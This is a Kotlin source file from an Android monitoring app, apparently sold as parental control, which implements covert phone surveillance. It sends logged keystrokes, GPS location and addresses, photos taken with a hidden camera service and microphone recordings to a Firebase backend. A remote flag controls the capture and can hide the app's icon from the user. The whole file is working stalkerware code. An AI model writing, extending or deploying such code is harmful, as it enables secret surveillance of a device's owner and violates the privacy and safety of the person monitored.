package com.github.midros.istheapp.services.accessibilityData

import android.content.Context
import android.location.Geocoder
import android.location.Location
import android.media.MediaRecorder
import android.net.Uri
import com.github.midros.istheapp.R
import com.github.midros.istheapp.data.model.ChildPhoto
import com.github.midros.istheapp.data.model.ChildRecording
import com.github.midros.istheapp.data.model.Photo
import com.github.midros.istheapp.data.model.Recording
import com.github.midros.istheapp.data.rxFirebase.InterfaceFirebase
import com.github.midros.istheapp.services.social.MonitorService
import com.github.midros.istheapp.utils.ConstFun.getDateTime
import com.github.midros.istheapp.utils.ConstFun.getRandomNumeric
import com.github.midros.istheapp.utils.ConstFun.showApp
import com.github.midros.istheapp.utils.Consts.ADDRESS_AUDIO_RECORD
import com.github.midros.istheapp.utils.Consts.CHILD_CAPTURE_PHOTO
import com.github.midros.istheapp.utils.Consts.CHILD_GPS
import com.github.midros.istheapp.utils.Consts.CHILD_PERMISSION
import com.github.midros.istheapp.utils.Consts.CHILD_SERVICE_DATA
import com.github.midros.istheapp.utils.Consts.CHILD_SHOW_APP
import com.github.midros.istheapp.utils.Consts.CHILD_SOCIAL_MS
import com.github.midros.istheapp.utils.Consts.DATA
import com.github.midros.istheapp.utils.Consts.INTERVAL
import com.github.midros.istheapp.utils.Consts.KEY_LOGGER
import com.github.midros.istheapp.utils.Consts.KEY_TEXT
import com.github.midros.istheapp.utils.Consts.LOCATION
import com.github.midros.istheapp.utils.Consts.PARAMS
import com.github.midros.istheapp.utils.Consts.PHOTO
import com.github.midros.istheapp.utils.Consts.RECORDING
import com.github.midros.istheapp.utils.Consts.SOCIAL
import com.github.midros.istheapp.utils.Consts.TAG
import com.github.midros.istheapp.utils.Consts.TIMER
import com.github.midros.istheapp.utils.FileHelper
import com.github.midros.istheapp.utils.FileHelper.getFileNameAudio
import com.github.midros.istheapp.utils.FileHelper.getFilePath
import com.github.midros.istheapp.utils.MediaRecorderUtils
import com.github.midros.istheapp.utils.MyCountDownTimer
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraCallbacks
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraConfig
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_IMAGE_WRITE_FAILED
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.HiddenCameraService
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.config.CameraRotation
import com.pawegio.kandroid.IntentFor
import com.pawegio.kandroid.e
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.disposables.CompositeDisposable
import io.reactivex.schedulers.Schedulers
import java.io.File
import java.io.IOException
import java.util.*
import javax.inject.Inject

/**
 * Created by luis rafael on 17/03/18.
 */
class InteractorAccessibilityData @Inject constructor(private val context: Context, private val firebase: InterfaceFirebase) : InterfaceAccessibility, CameraCallbacks {

    private var startTime = (1 * 60 * 1440000).toLong()
    private var interval = (1 * 1000).toLong()
    private var pictureCapture: HiddenCameraService = HiddenCameraService(context, this)
    private var disposable: CompositeDisposable = CompositeDisposable()

    private var timer : MyCountDownTimer?=null
    private var recorder: MediaRecorderUtils = MediaRecorderUtils{
        cancelTimer()
        deleteFile()
    }
    private var fileName: String? = null
    private var dateTime: String? = null
    private var nameAudio : String? =null

    private var countDownTimer : MyCountDownTimer = MyCountDownTimer(startTime,interval){
        if (firebase.getUser()!=null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).removeValue()
        startCountDownTimer()
    }

    override fun startCountDownTimer() {
        countDownTimer.start()
    }

    override fun stopCountDownTimer() {
        countDownTimer.cancel()
    }


    override fun clearDisposable() {
        //disposable.dispose()
        //disposable.clear()
    }

    override fun setDataKey(data: String) {
        if (firebase.getUser()!=null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).push().child(KEY_TEXT).setValue(data)
    }

    override fun setDataLocation(location: Location) {
        if (firebase.getUser() != null) {
            val address: String
            val geoCoder = Geocoder(context, Locale.getDefault())

            address = try {
                geoCoder.getFromLocation(location.latitude, location.longitude, 1)[0].getAddressLine(0)
            } catch (e: IOException) {
                context.getString(R.string.address_not_found)
            }

            val model = com.github.midros.istheapp.data.model.Location(location.latitude, location.longitude, address, getDateTime())
            firebase.getDatabaseReference("$LOCATION/$DATA").setValue(model)
        }

    }

    override fun enablePermissionLocation(location: Boolean) {
        if (firebase.getUser()!=null) firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_PERMISSION").setValue(location)
    }

    override fun enableGps(gps: Boolean) {
        if (firebase.getUser()!=null) firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_GPS").setValue(gps)
    }

    override fun setRunServiceData(run: Boolean) {
        if (firebase.getUser()!=null) firebase.getDatabaseReference("$DATA/$CHILD_SERVICE_DATA").setValue(run)
    }

    override fun getShowOrHideApp() {
        disposable.add(firebase.valueEvent("$DATA/$CHILD_SHOW_APP")
                .map { data -> data.value as Boolean }
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ context.showApp(it) },
                        { e(TAG, it.message.toString()) }))

    }

    override fun getCapturePicture() {
        disposable.add(firebase.valueEventModel("$PHOTO/$PARAMS", ChildPhoto::class.java)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ child -> startCameraPicture(child) },
                        { error -> e(TAG, error.message.toString()) }))
    }

    private fun startCameraPicture(childPhoto: ChildPhoto) {
        if (childPhoto.capturePhoto!!) {
            val cameraConfig = CameraConfig().builder(context)
                    .setCameraFacing(childPhoto.facingPhoto!!)
                    .setImageRotation(
                            if (childPhoto.facingPhoto == CameraFacing.FRONT_FACING_CAMERA) CameraRotation.ROTATION_270
                            else CameraRotation.ROTATION_90
                    )
                    .build()
            pictureCapture.startCamera(cameraConfig)
        }
    }

    override fun onImageCapture(imageFile: File) {
        pictureCapture.stopCamera()
        sendFilePhoto(imageFile.absolutePath)
    }

    override fun onCameraError(errorCode: Int) {
        pictureCapture.stopCamera()
        firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)

        if (errorCode == ERROR_CAMERA_PERMISSION_NOT_AVAILABLE ||
                errorCode == ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION ||
                errorCode == ERROR_IMAGE_WRITE_FAILED)

            firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(false)
    }

    private fun sendFilePhoto(imageFile: String?) {
        if (imageFile != null) {
            val namePhoto = getRandomNumeric()
            val uri = Uri.fromFile(File(imageFile))
            disposable.add(firebase.putFile("$PHOTO/$namePhoto", uri)
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe({ task ->
                        task.storage.downloadUrl.addOnCompleteListener {
                            setPushNamePhoto(it.result.toString(), namePhoto)
                            FileHelper.deleteFile(imageFile)
                        }
                    }, { error ->
                        e(TAG, error.message.toString())
                        FileHelper.deleteFile(imageFile)
                    }))
        }
    }

    private fun setPushNamePhoto(url: String, namePhoto: String) {
        val photo = Photo(namePhoto, getDateTime(), url)
        firebase.getDatabaseReference("$PHOTO/$DATA").push().setValue(photo)
        firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)
        firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(true)
    }


    override fun getSocialStatus() {
        disposable.add(firebase.valueEvent("$SOCIAL/$CHILD_SOCIAL_MS")
                .map { data -> data.exists() }
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ if (!it) context.startService(IntentFor<MonitorService>(context)) },
                        { e(TAG, it.message.toString()) }))
    }


    override fun getRecordingAudio() {
        disposable.add(firebase.valueEventModel("$RECORDING/$PARAMS", ChildRecording::class.java)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ child -> if (child.recordAudio!!){ startRecording(child.timeAudio!!) } },
                        { error -> e(TAG, error.message.toString()) }))
    }


    private fun startRecording(startTime:Long) {

        timer = MyCountDownTimer(startTime,interval,{ setIntervalRecord(it) }){stopRecording()}

        nameAudio = getRandomNumeric()
        dateTime = getDateTime()
        fileName = context.getFileNameAudio(nameAudio, dateTime)

        recorder.startRecording(MediaRecorder.AudioSource.MIC,fileName)
        timer!!.start()

    }

    private fun stopRecording() = recorder.stopRecording { sendFileAudio() }

    private fun cancelTimer(){
        if (timer!=null) timer!!.cancel()
    }

    private fun setIntervalRecord(interval:Long) {
        firebase.getDatabaseReference("$RECORDING/$TIMER/$INTERVAL").setValue(interval)
    }


    private fun deleteFile() {
        FileHelper.deleteFile(fileName)
        resetParamsRecording()
    }

    private fun sendFileAudio() {
        val filePath = "${context.getFilePath()}/$ADDRESS_AUDIO_RECORD"
        val dateName = fileName!!.replace("$filePath/", "")
        val uri = Uri.fromFile(File(fileName))
        disposable.add(firebase.putFile("$RECORDING/$dateName", uri)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ setPushName() }, { deleteFile() }))
    }

    private fun setPushName() {
        val duration = FileHelper.getDurationFile(fileName!!)
        val recording = Recording(nameAudio,dateTime,duration)
        firebase.getDatabaseReference("$RECORDING/$DATA").push().setValue(recording)
        deleteFile()
    }

    private fun resetParamsRecording(){
        val childRecording = ChildRecording(false,0)
        firebase.getDatabaseReference("$RECORDING/$PARAMS").setValue(childRecording)
        setIntervalRecord(0)
    }

}